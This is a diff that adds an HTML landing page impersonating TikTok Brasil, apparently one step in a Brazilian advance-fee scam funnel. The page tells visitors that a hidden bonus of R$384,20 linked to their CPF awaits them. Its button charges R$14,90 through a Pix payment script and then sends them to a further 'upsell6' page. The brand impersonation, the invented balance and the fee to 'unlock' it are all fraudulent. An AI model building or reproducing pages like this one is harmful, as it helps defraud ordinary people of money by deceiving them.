@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oferta Exclusiva - Avaliador TikTok</title>
+
+    </script>
+    <style>
+        :root {
+            --TikTok-orange: #FE2C55;
+            --TikTok-dark: #333333;
+            --TikTok-light: #FFF5EF;
+            --TikTok-yellow: #FFD600;
+            --TikTok-red: #FE2C55;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background-color: var(--TikTok-light);
+            color: var(--TikTok-dark);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 100%;
+            width: 100%;
+            padding: 15px;
+            margin: 0 auto;
+        }
+
+        .TikTok-header {
+            background: linear-gradient(135deg, var(--TikTok-orange), #FE2C55);
+            padding: 15px 0;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .TikTok-logo {
+            height: 40px;
+            margin-bottom: 10px;
+        }
+
+        .offer-container {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px auto;
+            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.1);
+            border: 1px solid rgba(255, 107, 0, 0.2);
+            max-width: 500px;
+        }
+
+        .offer-title {
+            color: var(--TikTok-orange);
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .offer-icon {
+            font-size: 30px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .offer-description {
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        .highlight {
+            background-color: rgba(255, 107, 0, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 3px solid var(--TikTok-orange);
+        }
+
+        .price-tag {
+            background-color: var(--TikTok-orange);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            display: inline-block;
+            margin: 10px 0;
+        }
+
+        .cta-button {
+            background: linear-gradient(to right, var(--TikTok-orange), #FE2C55);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 30px;
+            width: 100%;
+            cursor: pointer;
+            margin: 20px 0;
+            box-shadow: 0 4px 10px rgba(255, 107, 0, 0.3);
+            transition: all 0.3s ease;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(255, 107, 0, 0.4);
+        }
+
+        .cta-button:active {
+            transform: translateY(0);
+        }
+
+        .benefits-list {
+            list-style-type: none;
+            margin: 15px 0;
+        }
+
+        .benefits-list li {
+            padding: 8px 0;
+            padding-left: 30px;
+            position: relative;
+        }
+
+        .benefits-list li:before {
+            content: "✓";
+            color: var(--TikTok-orange);
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+        }
+
+        .timer {
+            background-color: var(--TikTok-red);
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: bold;
+            margin: 15px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .timer-icon {
+            margin-right: 10px;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            margin-top: 30px;
+            padding: 15px;
+        }
+
+        @media (max-width: 480px) {
+            .offer-title {
+                font-size: 20px;
+            }
+
+            .offer-description {
+                font-size: 15px;
+            }
+
+            .cta-button {
+                padding: 12px 20px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="TikTok-header">
+        <img src="images/logo.svg" alt="TikTok Logo" class="TikTok-logo">
+    </div>
+
+    <div class="container">
+        <div class="offer-container">
+            <div class="offer-icon">🎉</div>
+            <h1 class="offer-title">Liberação de Bônus Oculto do Sistema</h1>
+
+            <div class="offer-description">
+                <p>Parabéns! Você desbloqueou um saldo oculto não visível na primeira etapa.</p>
+
+                <div class="highlight">
+                    <p>O sistema identificou um valor adicional de <strong>R$384,20</strong> vinculado ao seu CPF.</p>
+                </div>
+
+                <p>Para resgatar esse bônus extra junto ao seu saque principal, ative agora a liberação.</p>
+            </div>
+
+
+            <p class="offer-description"><strong>🔓 Valor será enviado junto ao Pix após essa etapa.</strong></p>
+
+            <button onclick="redirectToPayment()" class="cta-button">LIBERAR MEU BÔNUS AGORA</button>
+
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2025 TikTok Brasil - Todos os direitos reservados
+    </div>
+
+
+    <script>
+        // Função para capturar os parâmetros GET da URL atual
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
+            let paramsObject = {};
+            params.forEach((value, key) => {
+                paramsObject[key] = value;
+            });
+            return paramsObject;
+        }
+
+        //reescrever redirects pra incluir parametros
+        function redirectWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location);
+
+            Object.keys(params).forEach(key => {
+                url.searchParams.set(key, params[key]);
+            });
+
+            window.location.href = url.toString();
+        }
+
+    </script>
+    <script src="../js/pix-integration.js"></script>
+    <script>
+        function redirectToPayment() {
+            if (window.initPixPayment) {
+                window.initPixPayment({
+                    amount: 14.90,
+                    nextPage: '/upsell6/',
+                    upsellIndex: 5
+                }, { name: '', cpf: '' });
+            } else {
+                alert('Erro no sistema de pagamento');
+            }
+        }
+    </script>
+
+
+</body>
+
+</html>
